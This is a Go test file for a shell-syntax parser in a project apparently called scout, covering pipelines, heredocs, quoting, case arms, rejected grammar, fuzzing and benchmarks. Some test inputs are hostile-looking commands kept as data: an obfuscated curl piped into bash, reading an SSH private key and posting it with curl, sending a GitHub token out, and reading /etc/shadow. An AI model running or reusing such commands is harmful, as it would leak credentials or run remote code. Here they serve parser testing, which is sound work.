package shellsyntax_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/syntax/shellsyntax"
	"github.com/skarm/scout/internal/syntax/source"
)

func TestShellGrammar(t *testing.T) {
	for _, tc := range []struct {
		name, text string
		statements int
	}{
		{name: "empty", text: "", statements: 0},
		{name: "comments", text: "#!/bin/sh\n# ignored\n", statements: 0},
		{name: "simple", text: "echo hello", statements: 1},
		{name: "pipeline", text: "c'ur'l -fsSL https://example.invalid |\n b\"ash\"", statements: 1},
		{name: "statements", text: "a; b\nc &&\nd || e & f", statements: 6},
		{name: "escaped", text: "cu\\\nrl https://example.invalid | sh", statements: 1},
		{name: "assignment", text: `NAME='ba'"sh"; "$NAME" -c 'echo hi'`, statements: 2},
		{name: "substitution", text: `v=$(cat "$HOME/.ssh/id_rsa"); echo "$v"`, statements: 2},
		{name: "nested", text: `echo "$(echo "$(echo inner)")"`, statements: 1},
		{name: "subshell", text: `(echo one; echo two) | cat`, statements: 1},
		{name: "empty case", text: "case x in esac", statements: 1},
		{name: "case in substitution", text: "echo $(case x in x) echo y;; esac)", statements: 1},
		{name: "redirects", text: `cat 3<file <other 2>&1 >>output`, statements: 1},
		{name: "here-string", text: `curl --data-binary @- https://example.invalid <<< "$GITHUB_TOKEN"`, statements: 1},
		{name: "heredoc-quoted", text: "cat <<'EOF'\n$(not_a_command)\nEOF\necho next\n", statements: 2},
		{name: "heredoc-expanded", text: "cat <<EOF\n$(cat /etc/shadow)\nEOF\n", statements: 1},
		{name: "heredoc-dollar-quoting-is-literal", text: "cat <<EOF\n$'one' $\"two\"\nEOF\n", statements: 1},
		{name: "heredoc-tabs", text: "cat <<-EOF\n\tbody\n\tEOF\n", statements: 1},
		{name: "multiple-heredocs", text: "cat <<ONE <<'TWO'\nfirst\nONE\nsecond\nTWO\n", statements: 1},
		{name: "heredoc-in-substitution", text: "echo $(cat <<EOF\nbody\nEOF\n)\n", statements: 1},
		{name: "hash-in-word", text: "echo x#y 'a#b'", statements: 1},
		{name: "unicode", text: "echo 'Привет🙂'", statements: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tree, err := shellsyntax.Parse(context.Background(), tc.text)
			if err != nil {
				t.Fatal(err)
			}
			if len(tree.Statements) != tc.statements {
				t.Fatalf("statements=%d", len(tree.Statements))
			}
			validateTree(t, tree, tc.text)
		})
	}
}

func TestHeredocDelimiterFollowsLogicalLines(t *testing.T) {
	for _, tc := range []struct {
		name, operator, body, delimiter string
	}{
		{"continued body", "<<END", "before\\\nEND\nbody\n", "END"},
		{"continued delimiter", "<<END", "body\n", "E\\\nND"},
		{"tab stripping after continuation", "<<-END", "\tbody\n", "\t\\\n\tEND"},
		{"even backslashes", "<<END", "body\\\\\n", "END"},
		{"quoted delimiter", "<<'END'", "body\\\n", "END"},
		{"quoted leading tab in delimiter", "<<-'\tEND'", "\tbody\n", "\tEND"},
		{"quoted leading hash in delimiter", "<<'#END'", "body\n", "#END"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			text := "cat " + tc.operator + "\n" + tc.body + tc.delimiter + "\necho next\n"
			tree, err := shellsyntax.Parse(t.Context(), text)
			if err != nil || len(tree.Statements) != 2 {
				t.Fatalf("heredoc boundary lost: %v, %v", tree, err)
			}

			body := tree.Statements[0].Commands[0].Redirects[0].Body.Span
			if got := text[body.Start:body.End]; got != tc.body {
				t.Fatalf("raw body = %q, want %q", got, tc.body)
			}
		})
	}
}

func TestSubshellAcceptsNumberedRedirects(t *testing.T) {
	for _, tc := range []struct{ redirect, fd, op string }{
		{redirect: ">out", fd: "", op: shellsyntax.RedirectOutput},
		{redirect: "2>out", fd: "2", op: shellsyntax.RedirectOutput},
		{redirect: "0<input", fd: "0", op: shellsyntax.RedirectInput},
	} {
		t.Run(tc.redirect, func(t *testing.T) {
			text := "(printf sample) " + tc.redirect
			tree, err := shellsyntax.Parse(t.Context(), text)
			if err != nil {
				t.Fatal(err)
			}
			validateTree(t, tree, text)
			cmd := tree.Statements[0].Commands[0]
			if cmd.Subshell == nil || len(cmd.Redirects) != 1 || len(cmd.Words) != 0 {
				t.Fatalf("subshell or redirect was lost: %+v", cmd)
			}
			redirect := cmd.Redirects[0]
			if redirect.FD != tc.fd || redirect.Op != tc.op || text[redirect.Span.Start:redirect.Span.End] != tc.redirect {
				t.Fatalf("unexpected redirect: %+v", redirect)
			}
		})
	}
	for _, word := range []string{"trailing", "2 >out"} {
		_, err := shellsyntax.Parse(t.Context(), "(printf sample) "+word)
		if failure, ok := errors.AsType[*shellsyntax.Error](err); !ok || failure.Code != "word_after_group" {
			t.Fatalf("unexpected error after group for %q: %v", word, err)
		}
	}
}

func TestWords(t *testing.T) {
	for _, tc := range []struct {
		text, want string
		known      bool
	}{
		{text: `echo c'ur'l`, want: "curl", known: true},
		{text: `echo b"a"sh`, want: "bash", known: true},
		{text: `echo a\ b`, want: "a b", known: true},
		{text: `echo '$TOKEN'`, want: "$TOKEN", known: true},
		{text: `echo "\$TOKEN"`, want: "$TOKEN", known: true},
		{text: `echo "a\q"`, want: `a\q`, known: true},
		{text: `echo "$TOKEN"`, want: "", known: false},
		{text: `echo $(cat x)`, want: "", known: false},
		{text: `echo *.txt`, want: "", known: false},
		{text: `echo "*.txt"`, want: "*.txt", known: true},
		{text: `echo ''`, want: "", known: true},
		{text: "echo \\🙂", want: "🙂", known: true},
	} {
		t.Run(tc.text, func(t *testing.T) {
			tree, err := shellsyntax.Parse(context.Background(), tc.text)
			if err != nil {
				t.Fatal(err)
			}
			v, ok := tree.Statements[0].Commands[0].Words[1].Literal()
			if v != tc.want || ok != tc.known {
				t.Fatalf("%q,%v", v, ok)
			}
		})
	}
}

func TestDoubleQuotedDollarBeforeQuoteStaysLiteral(t *testing.T) {
	for _, tc := range []struct{ name, word, want string }{
		{name: "closing quote", word: `"price$"`, want: "price$"},
		{name: "single quote inside double quotes", word: `"price$' USD"`, want: "price$' USD"},
		{name: "adjacent quoted segments", word: `"цена$"' USD'`, want: "цена$ USD"},
		{name: "single quotes", word: `'price$'`, want: "price$"},
		{name: "unquoted at end of word", word: `price$`, want: "price$"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			text := "printf '%s' " + tc.word
			tree, err := shellsyntax.Parse(t.Context(), text)
			if err != nil {
				t.Fatal(err)
			}
			validateTree(t, tree, text)
			word := tree.Statements[0].Commands[0].Words[2]
			if got, known := word.Literal(); !known || got != tc.want {
				t.Fatalf("literal = %q, known = %t, want %q", got, known, tc.want)
			}
			if got := text[word.Span.Start:word.Span.End]; got != tc.word {
				t.Fatalf("word covers %q, want %q", got, tc.word)
			}
		})
	}
}

func TestShellDollarQuotingRemainsModeSpecific(t *testing.T) {
	for _, text := range []string{`printf '%s' $'ansi'`, `printf '%s' $"locale"`} {
		_, err := shellsyntax.Parse(t.Context(), text)
		if failure, ok := errors.AsType[*shellsyntax.Error](err); !ok || failure.Code != "unsupported_dollar_quoting" {
			t.Fatalf("unsupported dollar quoting = %v for %q", err, text)
		}
	}

	const body = "$'one' $\"two\"\n"
	text := "cat <<END\n" + body + "END\n"
	tree, err := shellsyntax.Parse(t.Context(), text)
	if err != nil {
		t.Fatal(err)
	}
	validateTree(t, tree, text)
	word := tree.Statements[0].Commands[0].Redirects[0].Body
	if got, known := word.Literal(); !known || got != body || text[word.Span.Start:word.Span.End] != body {
		t.Fatalf("heredoc literal = %q, known = %t, want %q", got, known, body)
	}
}

func TestCaseArms(t *testing.T) {
	const text = `case "$0"
in
  (*/*|*\\*) SCRIPT_DIR="${0%[/\\]*}" ;;
  literal) case x in x) ;; esac ;;
  *) cat <<'END';;
esac ;;
END
  quoted) printf '%s' esac
esac 2>out
printf done
`
	tree, err := shellsyntax.Parse(context.Background(), text)
	if err != nil {
		t.Fatal(err)
	}
	validateTree(t, tree, text)
	if len(tree.Statements) != 2 {
		t.Fatalf("statements = %d", len(tree.Statements))
	}
	cmd := tree.Statements[0].Commands[0]
	if cmd.Case == nil || len(cmd.Case.Patterns) != 4 || len(cmd.Alternatives) != 5 || len(cmd.Redirects) != 1 ||
		text[cmd.Span.Start:cmd.Span.End] != strings.TrimSuffix(text, "\nprintf done\n") {
		t.Fatalf("incorrect case command: %+v", cmd)
	}
	patterns := cmd.Case.Patterns[0]
	if len(patterns) != 2 || text[patterns[0].Span.Start:patterns[0].Span.End] != "*/*" ||
		text[patterns[1].Span.Start:patterns[1].Span.End] != `*\\*` {
		t.Fatalf("incorrect pattern list: %+v", patterns)
	}
	value := cmd.Alternatives[0].Statements[0].Commands[0].Assignments[0].Value
	part := value.Parts[len(value.Parts)-1]
	if part.Kind != "parameter_script_dir" || part.Text != "0" || text[part.Span.Start:part.Span.End] != `${0%[/\\]*}` {
		t.Fatalf("incorrect script directory expansion: %+v", part)
	}
	heredoc := cmd.Alternatives[2].Statements[0].Commands[0].Redirects[0]
	if heredoc.Body == nil || text[heredoc.Body.Span.Start:heredoc.Body.Span.End] != "esac ;;\n" {
		t.Fatalf("incorrect heredoc in arm: %+v", heredoc)
	}
	if len(cmd.Alternatives[4].Statements) != 0 {
		t.Fatal("no-match path must have no statements")
	}
}

func TestRejectUnsupportedOrMalformed(t *testing.T) {
	for _, text := range []string{
		"()", "(\n)", "if true; then echo hi; fi", "for x in a; do echo x; done", "f() { echo hi; }", "{ echo hi; }", "[[ x ]]", "((x++))", "cat <(echo hi)",
		"echo `id`", `echo $'\x41'`, `echo "${TOKEN:-x}"`, `echo $((1+2))`,
		"echo '", "echo \"", "echo $(echo hi", "echo \\", "echo |", "echo &&", "cat <<EOF\nx\n", "cat >", "| echo", "; echo", "echo )", "cat ;; echo", "x\x00y", "\xff",
		"cat <<#END\nbody\n#END\n", "cat << \\\n#END\nbody\n#END\n",
		"case in", "case x 'in' esac", "case x in ) :;; esac", "case x in x|) :;; esac",
		"case x in x) : ;& esac", "case x in x) : ;;& esac", "case x in x) : && ;; esac",
		"case x in x) : || esac", "case x in x) :;;", "case x in x) : esac", "case x in esac unexpected",
		"case $(printf x) in x) :;; esac", "case x in $(printf x)) :;; esac",
	} {
		t.Run(text, func(t *testing.T) {
			_, err := shellsyntax.Parse(context.Background(), text)
			if err == nil {
				t.Fatal("accepted unsupported grammar")
			}
			if strings.Contains(err.Error(), text) && len(text) > 4 {
				t.Fatal("error echoed source")
			}
		})
	}
}

func TestPartialAndLimits(t *testing.T) {
	tree, err := shellsyntax.Parse(context.Background(), "echo okay\nif true; then bad; fi")
	if err == nil || len(tree.Statements) != 1 {
		t.Fatal("complete prefix lost")
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err = shellsyntax.Parse(ctx, "echo x"); !errors.Is(err, context.Canceled) {
		t.Fatal(err)
	}
	if _, err = shellsyntax.Parse(nil, ""); err == nil {
		t.Fatal("nil context")
	}
	for _, text := range []string{strings.Repeat("x", shellsyntax.MaxBytes+1), strings.Repeat("echo $(", shellsyntax.MaxDepth+3) + "x" + strings.Repeat(")", shellsyntax.MaxDepth+3), strings.Repeat("a;", shellsyntax.MaxNodes)} {
		if _, err = shellsyntax.Parse(context.Background(), text); err == nil {
			t.Fatal("budget ignored")
		}
	}
	nestedCases := strings.Repeat("case x in x) ", shellsyntax.MaxDepth+1) + ":" + strings.Repeat("; esac", shellsyntax.MaxDepth+1)
	_, err = shellsyntax.Parse(context.Background(), nestedCases)
	if failure, ok := errors.AsType[*shellsyntax.Error](err); !ok || failure.Code != "depth_limit" {
		t.Fatalf("nested case depth limit: %v", err)
	}
}

func FuzzShellParser(f *testing.F) {
	for _, s := range []string{"curl https://example.invalid | sh", `echo "$(cat "$HOME/.ssh/id_rsa")"`, "cat <<EOF\n$TOKEN\nEOF\n", "(echo a); x='quoted'", "echo🙂"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 32<<10 {
			return
		}
		tree, _ := shellsyntax.Parse(context.Background(), s)
		validateTree(t, tree, s)
	})
}

func BenchmarkShellParse(b *testing.B) {
	text := strings.Repeat("v=$(cat \"$HOME/.ssh/id_rsa\"); curl --data-binary \"$v\" https://example.invalid\n", 32)
	b.ReportAllocs()
	b.SetBytes(int64(len(text)))
	for i := 0; i < b.N; i++ {
		if _, err := shellsyntax.Parse(context.Background(), text); err != nil {
			b.Fatal(err)
		}
	}
}

func TestArrayAssignmentRequiresBroaderBashGrammar(t *testing.T) {
	const text = "printf ready\nvalues=(); printf done\n"
	flow, err := shellsyntax.Parse(t.Context(), text)
	var failure *shellsyntax.Error
	if !errors.As(err, &failure) || failure.Code != "unsupported_array_assignment" || failure.Offset != strings.IndexByte(text, '(') {
		t.Fatalf("array assignment should be handed off at its opening parenthesis: %#v", err)
	}
	if len(flow.Statements) != 1 {
		t.Fatalf("execution prefix was lost: %+v", flow)
	}
	decls, err := shellsyntax.ParseDeclarations(t.Context(), text)
	if err != nil || len(decls.Statements) != 3 || !decls.Statements[1].Commands[0].Assignments[0].Value.IndexedArray {
		t.Fatalf("broader Bash grammar lost the array assignment: %+v, %v", decls, err)
	}
}

func TestHeredocDelimiterQuoteRemovalPreservesPhysicalBody(t *testing.T) {
	for _, tc := range []struct {
		raw, delimiter string
		quoted         bool
	}{
		{raw: `E\OF`, delimiter: "EOF", quoted: true},
		{raw: `'EO"F'`, delimiter: `EO"F`, quoted: true},
		{raw: `"EO'F"`, delimiter: "EO'F", quoted: true},
		{raw: `$"EOF"`, delimiter: "EOF", quoted: true},
		{raw: `END$OF`, delimiter: "END$OF", quoted: false},
		{raw: `END'$'OF`, delimiter: "END$OF", quoted: true},
	} {
		text := "cat <<" + tc.raw + "\nbody\n" + tc.delimiter + "\n"
		tree, err := shellsyntax.Parse(context.Background(), text)
		if err != nil {
			t.Fatalf("%s: %v", tc.raw, err)
		}
		red := tree.Statements[0].Commands[0].Redirects[0]
		value, known := red.Target.Literal()
		if !known || value != tc.delimiter || red.QuotedDelimiter != tc.quoted {
			t.Fatalf("%s: delimiter=%q/%v quoted=%v", tc.raw, value, known, red.QuotedDelimiter)
		}
		if body := text[red.Body.Span.Start:red.Body.Span.End]; body != "body\n" {
			t.Fatalf("physical body changed: %q", body)
		}
	}
	for _, raw := range []string{`''`, `'EOF`, `"EOF`, `E\`, `$'EOF'`, "`EOF`"} {
		if _, err := shellsyntax.Parse(context.Background(), "cat <<"+raw+"\nbody\nEOF\n"); err == nil {
			t.Fatalf("unsupported delimiter accepted: %s", raw)
		}
	}
}

func TestShellTriviaContinuesCRLFAndHeredocDelimiterConsumesBudget(t *testing.T) {
	tree, err := shellsyntax.Parse(context.Background(), " \t# first\necho \\\r\n okay\n")
	if err != nil {
		t.Fatal(err)
	}
	words := tree.Statements[0].Commands[0].Words
	if value, known := words[1].Literal(); !known || value != "okay" {
		t.Fatal("continued word changed")
	}
	text := "cat <<" + strings.Repeat("D", shellsyntax.MaxNodes) + "\nbody\n"
	_, err = shellsyntax.Parse(context.Background(), text)
	var failure *shellsyntax.Error
	if !errors.As(err, &failure) || failure.Code != "node_limit" {
		t.Fatalf("delimiter scan ignored node budget: %v", err)
	}
}

func validateTree(t testing.TB, f *shellsyntax.File, text string) {
	t.Helper()
	if f == nil {
		return
	}
	span := func(s source.Span) {
		t.Helper()
		if s.Start < 0 || s.End < s.Start || s.End > len(text) {
			t.Fatalf("invalid span %+v, len=%d", s, len(text))
		}
	}
	word := func(w *shellsyntax.Word) {
		if w == nil {
			return
		}
		span(w.Span)
		for _, p := range w.Parts {
			span(p.Span)
			if p.Tree != nil {
				validateTree(t, p.Tree, text)
			}
		}
	}
	for _, s := range f.Statements {
		span(s.Span)
		if len(s.Commands) != len(s.Pipes)+1 {
			t.Fatal("pipeline contract")
		}
		for _, c := range s.Commands {
			span(c.Span)
			for _, w := range c.Words {
				word(w)
			}
			for _, a := range c.Assignments {
				span(a.Span)
				word(a.Value)
			}
			for _, r := range c.Redirects {
				span(r.Span)
				word(r.Target)
				word(r.Body)
			}
			validateTree(t, c.Subshell, text)
			if c.Case != nil {
				word(c.Case.Word)
				if len(c.Alternatives) != len(c.Case.Patterns)+1 {
					t.Fatal("case no-match branch missing")
				}
				for _, patterns := range c.Case.Patterns {
					for _, pattern := range patterns {
						word(pattern)
					}
				}
				for _, branch := range c.Alternatives {
					validateTree(t, branch, text)
				}
			}
		}
	}
}

func TestHeredocDoubleQuotedBackslashes(t *testing.T) {
	for _, tc := range []struct {
		name, raw, delimiter string
		quoted, declarations bool
	}{
		{name: "ordinary", raw: `"E\OF"`, delimiter: `E\OF`, quoted: true, declarations: true},
		{name: "dollar", raw: `"E\$OF"`, delimiter: "E$OF", quoted: true},
		{name: "backslash", raw: `"E\\OF"`, delimiter: `E\OF`, quoted: true},
		{name: "quote", raw: `"E\"OF"`, delimiter: `E"OF`, quoted: true},
		{name: "single-quoted", raw: `'E\OF'`, delimiter: `E\OF`, quoted: true, declarations: true},
		{name: "quoted-continuation", raw: "\"E\\\nOF\"", delimiter: "EOF", quoted: true, declarations: true},
		{name: "unquoted-continuation", raw: "E\\\nOF", delimiter: "EOF", quoted: false, declarations: true},
	} {
		for _, frontend := range []struct {
			name  string
			parse func(context.Context, string) (*shellsyntax.File, error)
		}{{name: "flow", parse: shellsyntax.Parse}, {name: "declarations", parse: shellsyntax.ParseDeclarations}} {
			// The declaration frontend explicitly rejects some delimiter forms
			// unsupported by its underlying syntax parser.
			if frontend.name == "declarations" && !tc.declarations {
				continue
			}

			t.Run(tc.name+"/"+frontend.name, func(t *testing.T) {
				text := "cat <<" + tc.raw + "\nbody\n" + tc.delimiter + "\necho next\n"
				tree, err := frontend.parse(t.Context(), text)
				if err != nil {
					t.Fatal(err)
				}
				if len(tree.Statements) != 2 {
					t.Fatalf("heredoc swallowed the next command: %d statements", len(tree.Statements))
				}
				red := tree.Statements[0].Commands[0].Redirects[0]
				if value, known := red.Target.Literal(); !known || value != tc.delimiter || red.QuotedDelimiter != tc.quoted {
					t.Fatalf("delimiter=%q/%v quoted=%v", value, known, red.QuotedDelimiter)
				}
				if red.Body == nil || text[red.Body.Span.Start:red.Body.Span.End] != "body\n" {
					t.Fatalf("incorrect physical body: %+v", red.Body)
				}
			})
		}
	}
}
